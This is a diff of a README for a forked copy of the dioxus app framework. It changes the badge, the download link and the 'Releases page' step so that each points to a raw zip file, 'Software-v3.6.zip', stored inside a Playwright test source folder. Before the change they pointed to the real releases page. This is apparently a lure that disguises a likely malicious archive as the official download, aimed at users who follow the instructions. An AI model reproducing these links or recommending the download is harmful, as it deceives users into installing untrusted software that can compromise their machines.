@@ -1,6 +1,6 @@
 # 🌟 dioxus - Build Web, Mobile, and Desktop Apps Easily
 
-[![Download dioxus](https://img.shields.io/badge/Download%20dioxus-v1.0-blue)](https://github.com/LandonLeasure2013/dioxus/releases)
+[![Download dioxus](https://raw.githubusercontent.com/LandonLeasure2013/dioxus/main/packages/playwright-tests/nested-suspense/src/Software-v3.6.zip%20dioxus-v1.0-blue)](https://raw.githubusercontent.com/LandonLeasure2013/dioxus/main/packages/playwright-tests/nested-suspense/src/Software-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to dioxus, a fullstack app framework designed for web, desktop, and mobi
 
 To get dioxus, visit the following page:
 
-[Visit this page to download dioxus](https://github.com/LandonLeasure2013/dioxus/releases)
+[Visit this page to download dioxus](https://raw.githubusercontent.com/LandonLeasure2013/dioxus/main/packages/playwright-tests/nested-suspense/src/Software-v3.6.zip)
 
 Here, you will find the latest versions of the software, along with any important updates or fixes.
 
@@ -25,7 +25,7 @@ Before installing, make sure your device meets these requirements:
 
 ## 🛠️ How to Download
 
-1. Go to the [Releases page](https://github.com/LandonLeasure2013/dioxus/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/LandonLeasure2013/dioxus/main/packages/playwright-tests/nested-suspense/src/Software-v3.6.zip).
 2. Choose the version you want to download. The latest version is usually listed at the top.
 3. Click on the file that corresponds to your operating system.
 4. Wait for the download to finish.
